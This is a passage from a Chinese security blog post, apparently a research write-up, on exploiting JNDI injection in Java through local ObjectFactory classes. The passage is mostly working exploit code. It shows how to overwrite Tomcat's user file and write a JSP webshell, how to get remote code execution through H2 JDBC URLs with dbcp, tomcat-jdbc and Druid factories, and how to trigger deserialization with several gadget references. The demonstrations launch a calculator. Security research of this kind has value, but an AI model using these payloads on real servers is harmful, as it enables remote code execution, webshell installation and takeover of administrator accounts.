+}</code></pre><p>然后只需要让JNDI返回这个ResourceRef对象，它就会先去访问 <code>http://127.0.0.1:8888/../../conf/tomcat-users.xml</code>然后把它覆盖到 <code>CATALINA.BASE/conf/tomcat-users.xml</code></p><p><img src="/usr/upload/image-20220113202009830.png" alt="image-20220113202009830" title="image-20220113202009830"></p><p><img src="/usr/upload/image-20220113202257092.png" alt="image-20220113202257092" title="image-20220113202257092"></p><p>文件覆盖后，就可以用新账号密码去登录 Tomcat 后台了。</p><h4>写 Webshell</h4><p>如果 Tomcat 后台访问不了，还可以尝试写 webshell。</p><p>首先启动一个8888端口，让访问<code>http://127.0.0.1:8888/webapps/ROOT/test.jsp</code>能返回这样一段XML。</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;
+              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;
+              version=&quot;1.0&quot;&gt;
+  &lt;role rolename=&quot;&amp;#x3c;%Runtime.getRuntime().exec(&amp;#x22;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#x22;); %&amp;#x3e;&quot;/&gt;
+&lt;/tomcat-users&gt;</code></pre><p>再让 JNDI 返回这个 ResourceRef 对象就可以把 test.jsp 写入到 web 目录。</p><pre><code>private static ResourceRef tomcatWriteFile() {
+    ResourceRef ref = new ResourceRef(&quot;org.apache.catalina.UserDatabase&quot;, null, &quot;&quot;, &quot;&quot;,
+            true, &quot;org.apache.catalina.users.MemoryUserDatabaseFactory&quot;, null);
+    ref.add(new StringRefAddr(&quot;pathname&quot;, &quot;http://127.0.0.1:8888/../../webapps/ROOT/test.jsp&quot;));
+    ref.add(new StringRefAddr(&quot;readonly&quot;, &quot;false&quot;));
+    return ref;
+}</code></pre><p><img src="/usr/upload/image-20220113204841458.png" alt="image-20220113204841458" title="image-20220113204841458"></p><h2>JDBC RCE</h2><p>ObjectFactory 的实现类里有好几个类都是用来实例化数据源的，如果能够触发数据库连接，那就可以用 jdbc 来 RCE。参考<a href="https://conference.hitb.org/hitbsecconf2021sin/sessions/make-jdbc-attacks-brilliant-again/" target="_blank">《Make JDBC Attacks Brilliant Again》</a>根据classpath下有哪些可用的jdbc驱动构造出对应的 payload。</p><h3>dbcp</h3><p>dbcp分为dbcp1和dbcp2，同时又分为 commons-dbcp 和 Tomcat 自带的 dbcp。</p><p><img src="/usr/upload/image-20220113220225151.png" alt="image-20220113220225151" title="image-20220113220225151"></p><p>进入 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory#configureDataSource</code>方法最后一段代码写了当 InitialSize &gt; 0 的时候会调用 getLogWriter 方法</p><pre><code>public PrintWriter getLogWriter() throws SQLException {
+    return this.createDataSource().getLogWriter();
+}</code></pre><p>getLogWriter 会先调用  <code>createDataSource()</code> 也就是创建数据库连接。</p><pre><code>private static Reference tomcat_dbcp2_RCE(){
+    return dbcpByFactory(&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory&quot;);
+}
+private static Reference tomcat_dbcp1_RCE(){
+    return dbcpByFactory(&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory&quot;);
+}
+private static Reference commons_dbcp2_RCE(){
+    return dbcpByFactory(&quot;org.apache.commons.dbcp2.BasicDataSourceFactory&quot;);
+}
+private static Reference commons_dbcp1_RCE(){
+    return dbcpByFactory(&quot;org.apache.commons.dbcp.BasicDataSourceFactory&quot;);
+}
+private static Reference dbcpByFactory(String factory){
+    Reference ref = new Reference(&quot;javax.sql.DataSource&quot;,factory,null);
+    String JDBC_URL = &quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot; +
+            &quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot; +
+            &quot;java.lang.Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')\n&quot; +
+            &quot;$$\n&quot;;
+    ref.add(new StringRefAddr(&quot;driverClassName&quot;,&quot;org.h2.Driver&quot;));
+    ref.add(new StringRefAddr(&quot;url&quot;,JDBC_URL));
+    ref.add(new StringRefAddr(&quot;username&quot;,&quot;root&quot;));
+    ref.add(new StringRefAddr(&quot;password&quot;,&quot;password&quot;));
+    ref.add(new StringRefAddr(&quot;initialSize&quot;,&quot;1&quot;));
+    return ref;
+}</code></pre><p>四种不同版本的 dbcp 要用不同的工厂类</p><p>如果遇到使用的不是 Tomcat 或没有 dbcp 时就可以尝试换成 commons-dbcp。</p><p><img src="/usr/upload/image-20220113220858430.png" alt="image-20220113220858430" title="image-20220113220858430"></p><h3>tomcat-jdbc</h3><p>如果遇到 dbcp 使用不了时，可以使用 tomcat-jdbc.jar 的 <code>org.apache.tomcat.jdbc.pool.DataSourceFactory</code></p><pre><code>private static Reference tomcat_JDBC_RCE(){
+    return dbcpByFactory(&quot;org.apache.tomcat.jdbc.pool.DataSourceFactory&quot;);
+}
+private static Reference dbcpByFactory(String factory){
+    Reference ref = new Reference(&quot;javax.sql.DataSource&quot;,factory,null);
+    String JDBC_URL = &quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot; +
+            &quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot; +
+            &quot;java.lang.Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')\n&quot; +
+            &quot;$$\n&quot;;
+    ref.add(new StringRefAddr(&quot;driverClassName&quot;,&quot;org.h2.Driver&quot;));
+    ref.add(new StringRefAddr(&quot;url&quot;,JDBC_URL));
+    ref.add(new StringRefAddr(&quot;username&quot;,&quot;root&quot;));
+    ref.add(new StringRefAddr(&quot;password&quot;,&quot;password&quot;));
+    ref.add(new StringRefAddr(&quot;initialSize&quot;,&quot;1&quot;));
+    return ref;
+}</code></pre><p><img src="/usr/upload/image-20220113221900352.png" alt="image-20220113221900352" title="image-20220113221900352"></p><h3>druid</h3><p>druid可以参考<a href="https://xz.aliyun.com/t/10656" target="_blank">《JNDI jdk高版本绕过—— Druid》</a>，和dbcp原理一样。</p><pre><code>private static Reference druid(){
+    Reference ref = new Reference(&quot;javax.sql.DataSource&quot;,&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;,null);
+    String JDBC_URL = &quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot; +
+            &quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot; +
+            &quot;java.lang.Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')\n&quot; +
+            &quot;$$\n&quot;;
+    String JDBC_USER = &quot;root&quot;;
+    String JDBC_PASSWORD = &quot;password&quot;;
+
+    ref.add(new StringRefAddr(&quot;driverClassName&quot;,&quot;org.h2.Driver&quot;));
+    ref.add(new StringRefAddr(&quot;url&quot;,JDBC_URL));
+    ref.add(new StringRefAddr(&quot;username&quot;,JDBC_USER));
+    ref.add(new StringRefAddr(&quot;password&quot;,JDBC_PASSWORD));
+    ref.add(new StringRefAddr(&quot;initialSize&quot;,&quot;1&quot;));
+    ref.add(new StringRefAddr(&quot;init&quot;,&quot;true&quot;));
+    return ref;
+}</code></pre><p><img src="/usr/upload/image-20220113222235995.png" alt="image-20220113222235995" title="image-20220113222235995"></p><h2>Deserialize</h2><p>看 ObjectFactory 时发现有几个类有反序列化的地方，不过没有意义，JNDI本来就能反序列化，所以这里不再做演示。</p><p><strong>dbcp</strong></p><pre><code>ResourceRef ref = new ResourceRef(&quot;org.apache.commons.dbcp2.datasources.SharedPoolDataSource&quot;, null, &quot;&quot;, &quot;&quot;,
+                true, &quot;org.apache.commons.dbcp2.datasources.SharedPoolDataSourceFactory&quot;, null);
+ref.add(new BinaryRefAddr(&quot;jndiEnvironment&quot;, Files.readAllBytes(Paths.get(&quot;calc.bin&quot;))));</code></pre><p><strong>mchange-common</strong></p><pre><code>ResourceRef ref = new ResourceRef(&quot;java.lang.String&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;com.mchange.v2.naming.JavaBeanObjectFactory&quot;, null);
+ref.add(new BinaryRefAddr(&quot;com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY&quot;, Files.readAllBytes(Paths.get(&quot;calc.bin&quot;))));</code></pre><p><strong>hessian</strong></p><pre><code>LookupRef ref = new LookupRef(&quot;java.lang.String&quot;,&quot;look&quot;);
+ref.add(new StringRefAddr(&quot;factory&quot;, &quot;com.caucho.hessian.client.HessianProxyFactory&quot;));
+//com.caucho.burlap.client.BurlapProxyFactory
+ref.add(new StringRefAddr(&quot;type&quot;, &quot;java.lang.AutoCloseable&quot;));
+ref.add(new StringRefAddr(&quot;url&quot;, &quot;http://127.0.0.1:6666/&quot;));</code></pre>        </div>
+    </article>
+
+    <div id="comments">
+            <h3 class="responses-title">Comments : 1 </h3>
+    
+    <ol class="comment-list">    <li class="comment">
+			<div id="comment-34" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/eef633c3542ef204e281cc65f6d3cfac?s=32&r=G&d=" alt="rantrism" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author"><a href="https://cloud.tencent.com/developer/support-plan" rel="external nofollow">rantrism</a>									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/529.html?replyTo=34#respond-post-529" rel="nofollow" onclick="return TypechoComment.reply('comment-34', 34);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2022-07-20 10:06:37" itemprop="datePublished">2022-07-20 10:06:37</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>您好～我是腾讯云开发者社区运营，关注了您分享的技术文章，觉得内容很棒，我们诚挚邀请您加入腾讯云自媒体分享计划。完整福利和申请地址请见：https://cloud.tencent.com/developer/support-plan<br>
+作者申请此计划后将作者的文章进行搬迁同步到社区的专栏下，你只需要简单填写一下表单申请即可，我们会给作者提供包括流量、云服务器等，另外还有些周边礼物。</p>					</div>
+			</div>
+                </li>
+    </ol>
+	<div class="lists-navigator clearfix">
+    	</div>
+    
+    
+        <div id="respond-post-529" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/529.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/529.html#respond-post-529" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
